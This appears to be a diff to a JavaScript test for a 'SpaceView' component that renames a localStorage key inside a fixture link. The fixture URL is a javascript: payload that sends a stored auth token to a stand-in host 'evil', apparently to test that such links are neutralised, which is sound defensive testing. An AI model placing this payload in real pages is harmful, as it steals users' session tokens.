@@ -74,7 +74,7 @@ describe("SpaceView", () => {
             {
               id: "r1",
               title: "Evil",
-              url: "javascript:fetch('//evil/'+localStorage.vitruvian-tabs_token)",
+              url: "javascript:fetch('//evil/'+localStorage.vitruvian_tabs_token)",
               createdAt: 0,
             },
           ],
